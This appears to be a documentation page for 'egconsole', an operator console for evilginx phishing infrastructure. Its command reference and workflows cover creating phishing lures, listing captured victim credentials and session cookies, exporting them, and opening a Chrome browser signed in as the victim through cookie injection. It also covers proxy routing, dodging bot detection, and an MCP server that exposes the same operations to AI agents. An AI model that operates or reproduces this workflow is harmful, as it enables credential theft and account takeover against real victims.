---
layout: default
title: egconsole
---

# egconsole — the remote operator interface

`tools/egconsole.py` is the operator's single console: a REPL on your
workstation that drives one or more nodes over their hidden mTLS API, exports
captured sessions, opens signed-in browsers, and runs node-side ops over SSH.
No agent or AI needed — this is the human control plane (the
[MCP server](mcp.md) is the AI-agent equivalent over the same API).

```bash
cd tools && python egconsole.py          # interactive REPL
python egconsole.py status               # one-shot: run a command, exit
```

## Configuration (gitignored operator files)

| File | Contents |
|---|---|
| `tools/my-servers.json` | Node list (bare JSON array): `{name, host, port, base, ca, cert, key}` + optional `relay` block. Client certs live in `tools/api-certs-vps/`. |
| `tools/console.json` | Optional SSH block `{ssh: {host, user, key}}` for `tail` / `puppet`. |

The mTLS client itself lives in `tools/lib/egapi.py` (shared with egctl and the
MCP server — one implementation, no per-tool copies).

## Command reference

### Node & phishlets

| Command | Effect |
|---|---|
| `use <node>` | select the default node (multi-node fleets) |
| `status` | node heartbeat (API reachability, session count) |
| `phishlets` | list phishlets with enabled/disabled state |
| `enable <pl>` / `disable <pl>` | hot-enable/disable — no service restart |
| `reload` | re-read phishlet YAMLs from disk |
| `hostname <pl> <host>` | change a phishlet's base hostname (keep `phish_sub` unique!) |

### Lures

| Command | Effect |
|---|---|
| `lures` | list lures (id, phishlet, path, redirect, relay flag) |
| `lure-create <pl> [redirect_url]` | new lure (**note: no auto token — prefer the API/MCP `lure_create` which sets `token:auto`**) |
| `lureurl <pl> <id> [k=v …]` | build the campaign URL (AES params: `rid`, `email`…) |
| `lure-edit <id> k=v [k=v …]` | partial edit — incl. `paused=<unix>` (0 = resume) |
| `lure-del <id>` | delete (⚠ deleting reindexes the remaining lure ids) |

### Sessions & replay

| Command | Effect |
|---|---|
| `sessions [n]` | list latest captures (username, password flag, cookie count, IP) |
| `session <id>` | full detail: credentials + per-domain cookie sets |
| `session-del <id>` | delete a session |
| `export <id> [file]` | cookies → Cookie-Editor extension JSON |
| `open <id> [--url U] [--fresh] [--headless] [--chrome P] [--port N] [--disable-http2]` | **opens a real Chrome window signed in as the victim** (cookies injected over CDP; `--disable-http2` for login.live.com quirks) |

### Proxy & node-side ops

| Command | Effect |
|---|---|
| `proxy` | show upstream proxy + routes (password masked) |
| `proxy set <type> <host> <port> <user> <pass> <routes-csv>` | configure (routes = domain suffixes through the proxy) |
| `proxy on` / `proxy off` | toggle (config kept) |
| `proxy route add\|del <suffix>` | hot-edit one route |
| `tail [n]` | tail the node's evilginx journal over SSH (ANSI stripped, noise filtered) |
| `puppet <lure-url> <user> <passfile>` | run the evilpuppet sidecar flow on the node |

## Common workflows

**Switch phishlets (verified zero-impact):** `disable google` → run ms365
campaign → `enable google`. No restart; certs survive via hot-reload.

**New campaign lure:** create with a token via the API (`POST /lures
{"phishlet":…, "token":"auto"}`) or MCP `lure_create`, then `lureurl` for the
URL and append `?t=<token>` from the lure record yourself.

**Use a capture:** `session <id>` to inspect → `export <id>` for a Cookie-Editor
file or `open <id>` for a live signed-in browser window. Close the window when
done — it's a live victim session on your desktop.

**Read the logs the right way:** `tail` inside the console, or on the node:
`journalctl -u evilginx2 -o cat | sed 's/\x1b\[[0-9;]*m//g'` (raw journal shows
colored blobs).

## Quirks (each one bit someone)

- The command is `lureurl` (no dash); `lure-url` is unknown syntax.
- `lureurl` output does **not** include the gate token — tokens are campaign
  secrets; read them from `lures`.
- A 141-byte "It works!" response from curl means **botguard classified you** —
  not a fault; render-test via trusted loopback on the node.
- Deleting a lure reindexes ids — re-run `lures` before editing by id.
- `lure-create` in the console doesn't set a token; prefer API/MCP creation
  (`token: "auto"`).

## Related

- [MCP server](mcp.md) — the same operations as AI-agent tools
- [Operations guide](operations.md) — workflow-level documentation
- [mTLS API](api.md) — the endpoint reference underneath
